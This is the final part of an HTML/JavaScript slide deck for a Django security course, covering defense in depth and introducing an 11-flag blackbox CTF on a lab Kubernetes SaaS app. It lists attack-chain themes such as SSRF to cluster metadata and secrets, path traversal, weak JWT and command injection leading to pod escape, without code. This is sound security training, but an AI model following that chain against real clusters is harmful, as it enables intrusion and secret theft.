["REVIEW","Defense in depth",`<h2>Decide correctly. Fail narrowly.</h2><div class='grid'><div class='card safe'><h3>Application decides</h3><ul><li>Derive sensitive values server-side</li><li>Bind actions to authorized objects</li><li>Use allowlists and narrow APIs</li><li>Re-check worker invariants</li><li>Validate outbound destinations</li></ul></div><div class='card'><h3>Infrastructure contains</h3><ul><li>Narrow service permissions</li><li>Egress controls</li><li>Namespace isolation</li><li>Separate risky workers</li><li>Read-only filesystems and fake lab secrets</li></ul></div></div>`,"Infrastructure cannot infer business rules; it can limit blast radius."],
["CTF RUNWAY","Transition to final CTF",`<h2>So far, each boundary was visible.</h2><div class='grid three'><div class='card'><h3>Classic web</h3><p>Framework rails and dangerous bypasses.</p></div><div class='card'><h3>Business objects</h3><p>Identity is not object authorization.</p></div><div class='card'><h3>Integrations</h3><p>The backend acts with more authority than the user.</p></div></div><p class='lead' style='margin-top:25px'>In the final blackbox CTF, these ideas will be hidden inside a SaaS-style app running in Kubernetes.</p><div class='path'>Flags + scoring: <span class='accent'>ctf.localhost</span> · challenge instances: <span class='accent'>challenge1.localhost · challenge2.localhost</span></div>`,"The product story hides the bug; trust analysis reveals it."],
["FINAL CTF","Final blackbox CTF",`<div class='split'><div><h1>Scenario<br><span class='accent'>SaaS in Kubernetes.</span></h1><p class='lead'>A SaaS control plane running on Kubernetes. Poor container hygiene, an over-scoped ServiceAccount, and a privileged legacy pod mask an 11-flag attack chain.</p><a class='demo' href='https://ctf.localhost/' target='_blank'>Open blackbox CTF · 11 flags</a></div><div class='card'><h3>Chain themes</h3><ul><li>Docker layer leak</li><li>Exposed Swagger + debug endpoint</li><li>Path traversal, IDOR, weak JWT</li><li>SSRF → k8s metadata → secrets</li><li>Command injection → pod escape</li></ul></div></div>`,"The CTF should test reasoning, not recall."],
["CLOSE","Closing question","<h2>One last code-review question.</h2><p class='giant'><span class='warning'>What does this code trust</span><br>that it shouldn’t?</p><button class='reveal'>Reveal the follow-up</button><div class='answer'>And what can the backend do with that trust?</div>","Application intent + infrastructure containment."]
];
var deck=document.getElementById("deck");S.forEach(function(s,i){var section=document.createElement("section");section.className="slide"+(i===0?" active":"");section.dataset.phase=s[0];section.dataset.title=s[1];section.innerHTML="<div class='eyebrow'>"+s[0]+"</div><div class='content'>"+s[2]+"</div><footer class='principle'>"+s[3]+"</footer>";deck.appendChild(section)});var slides=[].slice.call(document.querySelectorAll(".slide")),counter=document.getElementById("counter"),bar=document.getElementById("bar"),phase=document.getElementById("phase"),idx=0;function pad(n){return String(n).padStart(2,"0")}function show(n,push){n=Math.max(0,Math.min(slides.length-1,n));slides.forEach(function(s,i){s.classList.toggle("active",i===n);s.classList.toggle("exit",i<n)});idx=n;counter.textContent=pad(idx+1)+" / "+pad(slides.length);bar.style.width=((idx+1)/slides.length*100)+"%";phase.textContent=slides[idx].dataset.phase;document.title=pad(idx+1)+" · "+slides[idx].dataset.title+" - Django Security";if(push!==false)history.replaceState(null,"","#"+(idx+1))}
var overview=document.getElementById("overview"),help=document.getElementById("help"),grid=document.getElementById("overviewGrid");slides.forEach(function(s,i){var b=document.createElement("button");b.innerHTML="<span>"+pad(i+1)+" · "+s.dataset.phase+"</span>"+s.dataset.title;b.onclick=function(){overview.classList.remove("open");show(i)};grid.appendChild(b)});function toggleOverview(){help.classList.remove("open");overview.classList.toggle("open")}function toggleHelp(){overview.classList.remove("open");help.classList.toggle("open")}document.getElementById("overviewBtn").onclick=toggleOverview;document.getElementById("helpBtn").onclick=toggleHelp;help.onclick=function(e){if(e.target===help)help.classList.remove("open")};
document.addEventListener("keydown",function(e){if(["INPUT","TEXTAREA"].indexOf(e.target.tagName)>=0)return;if(e.key==="Escape"){overview.classList.remove("open");help.classList.remove("open");return}if(e.key.toLowerCase()==="o"){toggleOverview();return}if(e.key==="?"){toggleHelp();return}if(e.key.toLowerCase()==="f"){document.fullscreenElement?document.exitFullscreen():document.documentElement.requestFullscreen();return}if(overview.classList.contains("open")||help.classList.contains("open"))return;if(["ArrowRight"," ","PageDown","j"].indexOf(e.key)>=0){e.preventDefault();show(idx+1)}if(["ArrowLeft","PageUp","k"].indexOf(e.key)>=0){e.preventDefault();show(idx-1)}if(e.key==="Home")show(0);if(e.key==="End")show(slides.length-1)});
document.addEventListener("click",function(e){if(e.target.closest("a,button,.timer"))return;if(e.clientX>innerWidth*.72)show(idx+1);else if(e.clientX<innerWidth*.28)show(idx-1)});
document.querySelectorAll(".timer").forEach(function(timer){var initial=Number(timer.dataset.minutes)*60,remaining=initial,tick=null,clock=timer.querySelector(".clock"),toggle=timer.querySelector(".timer-toggle"),reset=timer.querySelector(".timer-reset");function paint(){clock.textContent=pad(Math.floor(remaining/60))+":"+pad(remaining%60);clock.style.color=remaining<=60?"var(--danger)":"var(--warning)"}toggle.onclick=function(){if(tick){clearInterval(tick);tick=null;toggle.textContent="Start"}else{toggle.textContent="Pause";tick=setInterval(function(){remaining=Math.max(0,remaining-1);paint();if(!remaining){clearInterval(tick);tick=null;toggle.textContent="Done"}},1000)}};reset.onclick=function(){clearInterval(tick);tick=null;remaining=initial;toggle.textContent="Start";paint()};paint()});document.querySelectorAll(".reveal").forEach(function(b){b.onclick=function(){b.nextElementSibling.classList.toggle("show")}});var h=Number(location.hash.slice(1))-1;show(Number.isFinite(h)&&h>=0?h:0,false);
